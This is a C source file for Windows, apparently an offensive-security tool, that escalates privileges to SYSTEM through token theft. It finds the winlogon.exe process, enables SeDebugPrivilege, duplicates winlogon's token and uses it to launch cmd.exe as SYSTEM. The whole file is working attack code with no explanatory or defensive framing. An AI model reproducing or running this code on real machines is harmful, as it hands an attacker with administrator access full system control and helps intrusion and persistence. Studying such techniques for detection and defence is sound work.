#include <windows.h>
#include <stdio.h>
#include "Defines.h"


DWORD FindPID( LPCWSTR processName ) {

    HANDLE hNtdll = GetModuleHandleA( "ntdll.dll" );

    fnNtQuerySystemInformation NtQuerySystemInformation = ( fnNtQuerySystemInformation )GetProcAddress( hNtdll, "NtQuerySystemInformation" );

    if ( !NtQuerySystemInformation ) {
        fprintf( stderr, "[-] GetProcAddress failed: %d\n", GetLastError() );
        return 0;
    }

    NTSTATUS status;
    ULONG returnLength = 0;
    status = NtQuerySystemInformation( SystemProcessInformation, NULL, 0, &returnLength );
    if ( status != STATUS_INFO_LENGTH_MISMATCH ) {
        fprintf( stderr, "[-] NtQuerySystemInformation failed: 0x%X\n", status );
        return 0;
    }

    PVOID processInfo = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength );
    if ( !processInfo ) {
        fprintf( stderr, "[-] HeapAlloc failed: %d\n", GetLastError() );
        return 0;
    }

    status = NtQuerySystemInformation( SystemProcessInformation, processInfo, returnLength, &returnLength );
    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] NtQuerySystemInformation failed: 0x%X\n", status );
        HeapFree( GetProcessHeap(), 0, processInfo );
        return 0;
    }

    DWORD pid = 0;
    PSYSTEM_PROCESS_INFORMATION pInfo = ( PSYSTEM_PROCESS_INFORMATION )processInfo;
    while ( TRUE ) {
        if ( pInfo->ImageName.Buffer && _wcsicmp( pInfo->ImageName.Buffer, processName ) == 0 ) {
            pid = ( DWORD )( ULONG_PTR )pInfo->UniqueProcessId;
            break;
        }
        if ( pInfo->NextEntryOffset == 0 ) {
            break;
        }

        pInfo = ( PSYSTEM_PROCESS_INFORMATION )( ( PBYTE )pInfo + pInfo->NextEntryOffset );
    }

    HeapFree( GetProcessHeap(), 0, processInfo );
    return pid;
}

BOOL EnableSeDebugPrivilege() {
    HANDLE hToken;
    if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) ) {
        fprintf( stderr, "[-] OpenProcessToken failed: %d\n", GetLastError() );
        return FALSE;
    }

    TOKEN_PRIVILEGES tokenPrivilege;
    tokenPrivilege.PrivilegeCount = 1;
    tokenPrivilege.Privileges[ 0 ].Luid.LowPart = 20;
    tokenPrivilege.Privileges[ 0 ].Luid.HighPart = 0;
    tokenPrivilege.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

    if ( !AdjustTokenPrivileges( hToken, FALSE, &tokenPrivilege, sizeof( TOKEN_PRIVILEGES ), NULL, NULL ) ) {
        fprintf( stderr, "[-] AdjustTokenPrivileges failed: %d\n", GetLastError() );
        CloseHandle( hToken );
        return FALSE;
    }

    if ( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) {
        fprintf( stderr, "[-] The token does not have the specified privilege.\n" );
        CloseHandle( hToken );
        return FALSE;
    }

    return TRUE;
}

BOOL ImpersonateSystem( DWORD pid ) {

    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    hProcess = OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, pid );
    if ( !hProcess ) {
        fprintf( stderr, "[-] OpenProcess failed: %d\n", GetLastError() );
        return FALSE;
    }

    if ( !OpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken ) ) {
        fprintf( stderr, "[-] OpenProcessToken failed: %d\n", GetLastError() );
        CloseHandle( hProcess );
        return FALSE;
    }

    if ( !DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken ) ) {
        fprintf( stderr, "[-] DuplicateTokenEx failed: %d\n", GetLastError() );
        CloseHandle( hToken );
        CloseHandle( hProcess );
        return FALSE;
    }

    if ( !ImpersonateLoggedOnUser( hDupToken ) ) {
        fprintf( stderr, "[-] ImpersonateLoggedOnUser failed: %d\n", GetLastError() );
        CloseHandle( hDupToken );
        CloseHandle( hToken );
        CloseHandle( hProcess );
        return FALSE;
    }

    STARTUPINFOW si = { 0 };
    si.cb = sizeof( STARTUPINFOW );
    PROCESS_INFORMATION pi = { 0 };
    if ( !CreateProcessWithTokenW( hDupToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi ) ) {
        fprintf( stderr, "[-] CreateProcessWithTokenW failed: %d\n", GetLastError() );
        CloseHandle( hDupToken );
        CloseHandle( hToken );
        CloseHandle( hProcess );
        return FALSE;
    }
    printf( "[+] Created SYSTEM process with PID: %lu\n", pi.dwProcessId );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    CloseHandle( hDupToken );
    CloseHandle( hToken );
    CloseHandle( hProcess );
    return TRUE;
}

int main( void ) {


    LPCWSTR processName = L"winlogon.exe";
    DWORD pid = FindPID( processName );

    if ( !pid ) {
        fprintf( stderr, "[-] Failed to find PID for process: %ls\n", processName );
        return 1;
    }
    printf( "[+] Found PID for process %ls: %lu\n", processName, pid );


    if ( !EnableSeDebugPrivilege() ) {
        fprintf( stderr, "[-] Failed to enable SeDebugPrivilege\n" );
        return 1;
    }

    printf( "[+] SeDebugPrivilege enabled successfully\n" );


    if ( !ImpersonateSystem( pid ) ) {
        fprintf( stderr, "[-] Failed to impersonate SYSTEM\n" );
        return 1;
    }
}